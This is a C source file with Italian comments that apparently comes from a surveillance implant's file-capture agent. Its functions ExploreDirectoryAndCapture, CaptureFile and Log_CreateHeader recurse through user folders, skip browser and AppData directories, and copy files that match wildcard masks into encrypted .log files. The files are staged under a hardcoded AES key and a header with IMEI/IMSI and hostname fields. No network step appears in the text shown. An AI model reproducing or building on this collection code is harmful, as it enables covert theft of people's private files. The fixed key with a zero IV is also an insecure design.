#include "stdafx.h"
#include "aes_alg.h"
#include "commons.h"

#define CRYPT_COPY_BUF_LEN 102400
#define PM_FILEAGENT_CAPTURE 0x00000001
#define BLOCK_LEN 16 

typedef struct _LogStruct{
	UINT uVersion;			// Versione della struttura
		#define LOG_VERSION	2008121901
	UINT uLogType;			// Tipo di log
	UINT uHTimestamp;		// Parte alta del timestamp
	UINT uLTimestamp;		// Parte bassa del timestamp
	UINT uDeviceIdLen;		// IMEI/Hostname len
	UINT uUserIdLen;		// IMSI/Username len
	UINT uSourceIdLen;		// Numero del caller/IP len	
	UINT uAdditionalData;	// Lunghezza della struttura addizionale, se presente
}LogStruct, *pLogStruct;

typedef struct _FileAdditionalData {
	UINT uVersion;
		#define LOG_FILE_VERSION 2008122901
	UINT uFileNameLen;
} FileAdditionalData, *pFileAdditionalData;

BYTE global_key[]="\xab\x12\xcd\x34\xef\x56\x01\x23\x45\x67\x89\xab\xcd\xef\x00\x11";

BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_len, DWORD *out_len)
{
	FILETIME tstamp;
	WCHAR user_name[256];
	WCHAR host_name[256];
	DWORD header_len;
	DWORD padded_len;
	BYTE iv[BLOCK_LEN];
	aes_context crypt_ctx;
	BYTE *final_header, *ptr;
	LogStruct log_header;

	if (out_len)
		*out_len = 0;

	// Calcola i campi da mettere nell'header
	memset(user_name, 0, sizeof(user_name));
	memset(host_name, 0, sizeof(host_name));
	user_name[0]=L'-';
	host_name[0]=L'-';
	GetSystemTimeAsFileTime(&tstamp);

	// Riempie l'header
	log_header.uDeviceIdLen = wcslen(host_name)*sizeof(WCHAR);
	log_header.uUserIdLen   = wcslen(user_name)*sizeof(WCHAR);
	log_header.uSourceIdLen = 0;
	if (additional_data) 
		log_header.uAdditionalData = additional_len;
	else
		log_header.uAdditionalData = 0;
	log_header.uVersion = LOG_VERSION;
	log_header.uHTimestamp = tstamp.dwHighDateTime;
	log_header.uLTimestamp = tstamp.dwLowDateTime;
	log_header.uLogType = agent_tag;

	// Calcola la lunghezza totale dell'header e il padding
	header_len = sizeof(LogStruct) + log_header.uDeviceIdLen + log_header.uUserIdLen + log_header.uSourceIdLen + log_header.uAdditionalData;
	padded_len = header_len;
	if (padded_len % BLOCK_LEN) {
		padded_len /= BLOCK_LEN;
		padded_len++;
		padded_len *= BLOCK_LEN;
	}
	padded_len += sizeof(DWORD);
	if (padded_len < header_len)
		return NULL;
	final_header = (BYTE *)malloc(padded_len);
	if (!final_header)
		return NULL;
	ptr = final_header;

	// Scrive l'header
	header_len = padded_len - sizeof(DWORD);
	header_len |= 0x80000000; // Setta il bit alto per distinguerlo dagli altri tipi di log
	memcpy(ptr, &header_len, sizeof(DWORD));
	ptr += sizeof(DWORD);
	memcpy(ptr, &log_header, sizeof(log_header));
	ptr += sizeof(log_header);
	memcpy(ptr, host_name, log_header.uDeviceIdLen);
	ptr += log_header.uDeviceIdLen;
	memcpy(ptr, user_name, log_header.uUserIdLen);
	ptr += log_header.uUserIdLen;
	if (additional_data)
		memcpy(ptr, additional_data, additional_len);

	// Cifra l'header (la prima DWORD e' in chiaro)
	memset(iv, 0, sizeof(iv));
	aes_set_key( &crypt_ctx, global_key, 128);
	aes_cbc_encrypt(&crypt_ctx, iv, final_header+sizeof(DWORD), final_header+sizeof(DWORD), padded_len-sizeof(DWORD));
	if (out_len)
		*out_len = padded_len;
	
	return final_header;
}

BYTE *EncryptBuffer(BYTE *buff, DWORD buff_len, DWORD *crypt_len)
{
	DWORD *ptr;       // Indice nel buffer cifrato
	BYTE *crypt_buff;
	DWORD tot_len;
	aes_context crypt_ctx;
	BYTE iv[BLOCK_LEN];

	tot_len = buff_len;
	if (tot_len % BLOCK_LEN) {
		tot_len /= BLOCK_LEN;
		tot_len++;
		tot_len *= BLOCK_LEN;
	}
	tot_len += sizeof(DWORD);

	// Check overflow
	if (tot_len < buff_len)
		return NULL;

	// Alloca il buffer
	crypt_buff = (BYTE *)malloc(tot_len);
	if (!crypt_buff)
		return NULL;

	*crypt_len = tot_len;

	// Copia la lunghezza originale 
	ptr = (DWORD *)crypt_buff;
	*ptr = buff_len;
	ptr++;

	// Copia il buffer in chiaro (rimarranno dei byte di padding
	// inutilizzati).
	memcpy(ptr, buff, buff_len);
	memset(iv, 0, sizeof(iv));
	aes_set_key( &crypt_ctx, global_key, 128);

	// Cifra tutto il blocco
	aes_cbc_encrypt(&crypt_ctx, iv, (BYTE *)ptr, (BYTE *)ptr, tot_len-sizeof(DWORD));

	return crypt_buff;
}

BOOL Log_WriteFile(HANDLE handle, BYTE *clear_buffer, DWORD clear_len)
{
	DWORD dwTmp;
	BOOL ret_val;
	DWORD crypt_len = 0;
	BYTE *crypt_buffer = NULL;

	if (handle == INVALID_HANDLE_VALUE || clear_len == 0 || clear_buffer == NULL)
		return FALSE;

	if (!(crypt_buffer = EncryptBuffer(clear_buffer, clear_len, &crypt_len))) {
		SAFE_FREE(crypt_buffer);
		return FALSE;
	}

	ret_val = WriteFile(handle, crypt_buffer, crypt_len, &dwTmp,  NULL);
	SAFE_FREE(crypt_buffer);
	return ret_val;
}

WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_path)
{
	WCHAR *term;

	_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s", start_path);	
	if ( (term = wcsrchr(dest_path, L'\\')) ) {
		term++;
		*term = NULL;
		_snwprintf_s(dest_path, MAX_PATH, _TRUNCATE, L"%s%s", dest_path, file_name);	
	} 
		
	return dest_path;
}

WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path)
{
	_snwprintf_s(recurse_path, MAX_PATH, _TRUNCATE, L"%s\\*", start_path);	
	return recurse_path;
}

void CaptureFile(WCHAR *file_path, WCHAR *dest_dir)
{
	static DWORD i = 0;
	FileAdditionalData *file_additional_data;
	BYTE *log_file_header;
	BYTE *temp_buff;
	DWORD header_len;
	DWORD dwRead;
	FILETIME time_nanosec;
	WCHAR dest_file_path[MAX_PATH];
	HANDLE shfile, dhfile;

	if ( !(file_additional_data = (FileAdditionalData *)malloc(sizeof(FileAdditionalData) + wcslen(file_path) * sizeof(WCHAR))))
		return;

	file_additional_data->uVersion = LOG_FILE_VERSION;
	file_additional_data->uFileNameLen = wcslen(file_path) * sizeof(WCHAR);
	memcpy(file_additional_data+1, file_path, file_additional_data->uFileNameLen);
		
	log_file_header = Log_CreateHeader(PM_FILEAGENT_CAPTURE, (BYTE *)file_additional_data, file_additional_data->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return;

	GetSystemTimeAsFileTime(&time_nanosec);	
	_snwprintf_s(dest_file_path, sizeof(dest_file_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%.4X%.8X%.8X.log", dest_dir, i++, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
	dhfile = CreateFileW(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (dhfile == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		return;
	}

	shfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (shfile == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		CloseHandle(dhfile);
		return;
	}
		
	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
		SAFE_FREE(log_file_header);
		CloseHandle(shfile);
		CloseHandle(dhfile);
		return;
	}

	if (WriteFile(dhfile, log_file_header, header_len, &dwRead, NULL)) {
		LOOP {
			dwRead = 0;
			if (!ReadFile(shfile, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
				break;
			if (!Log_WriteFile(dhfile, temp_buff, dwRead))
				break;
		}
	}

	SAFE_FREE(temp_buff);
	SAFE_FREE(log_file_header);
	CloseHandle(shfile);
	CloseHandle(dhfile);
}

int CmpWildW(WCHAR *wild, WCHAR *string) 
{
	WCHAR *cp = NULL, *mp = NULL;

	while ((*string) && (*wild != '*')) {
		if ((towupper((WCHAR)*wild) != towupper((WCHAR)*string)) && (*wild != '?')) {
			return 0;
		}
		wild++;
		string++;
	}

	while (*string) {
		if (*wild == '*') {
			if (!*++wild) {
				return 1;
			}

			mp = wild;
			cp = string+1;
		} else if ((towupper((WCHAR)*wild) == towupper((WCHAR)*string)) || (*wild == '?')) {
			wild++;
			string++;
		} else {
			wild = mp;
			string = cp++;
		}
	}

	while (*wild == '*') {
		wild++;
	}

	return !*wild;
}

BOOL FileMatchMask(WCHAR *file_name, WCHAR **masks)
{
	if (!masks || !file_name)
		return FALSE;

	for (DWORD i=0; masks[i]; i++)
		if (CmpWildW(masks[i], file_name))
			return TRUE;

	return FALSE;
}


void ExploreDirectoryAndCapture(WCHAR *start_path, DWORD depth, WCHAR **masks, WCHAR *dest_dir)
{
	WIN32_FIND_DATAW finddata;
	HANDLE hfind;
	WCHAR file_path[MAX_PATH], recurse_path[MAX_PATH];

	if (depth==0)
		return;
	hfind = FindFirstFileW(start_path, &finddata);
	if (hfind == INVALID_HANDLE_VALUE)
		return;
	do {
		if (!wcscmp(finddata.cFileName, L".") || !wcscmp(finddata.cFileName, L"..") || !_wcsicmp(finddata.cFileName, L"Temporary Internet Files") ||
			!_wcsicmp(finddata.cFileName, L"AppData") || !_wcsicmp(finddata.cFileName, L"Local Settings") || 
			!_wcsicmp(finddata.cFileName, L"Application Data") || !_wcsicmp(finddata.cFileName, L"Cookies"))
			continue;
		
		CompleteDirectoryPath(start_path, finddata.cFileName, file_path);

		if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ExploreDirectoryAndCapture(RecurseDirectory(file_path, recurse_path), depth-1, masks, dest_dir);
		else if (FileMatchMask(finddata.cFileName, masks))
			CaptureFile(file_path, dest_dir);

	} while(FindNextFileW(hfind, &finddata));
	FindClose(hfind);
}

WCHAR **PopulateMasks(WCHAR *patterns)
{
	WCHAR *l_patterns = NULL;
	WCHAR *ptr, *end;
	WCHAR **masks = NULL;
	DWORD p_count = 0, i;
	
	if (!patterns)
		return NULL;
	if (!(l_patterns = _wcsdup(patterns)))
		return NULL;

	for(ptr=l_patterns, p_count=1; ptr=wcschr(ptr, L'|'); p_count++, ptr++);
	if (!(masks = (WCHAR **)calloc(p_count+1, sizeof(WCHAR *)))) {
		SAFE_FREE(l_patterns);
		return NULL;
	}

	ptr = l_patterns; 
	i = 0;
	LOOP {
		if (end = wcschr(ptr, L'|')) 
			*end = 0;
		masks[i] = _wcsdup(ptr);
		if (!end)
			break;
		ptr = end+1;
		i++;
	} 

	SAFE_FREE(l_patterns);
	return masks;
}

void FreeMasks(WCHAR **masks)
{
	for (DWORD i=0; masks[i]; i++)
		SAFE_FREE(masks[i]);
}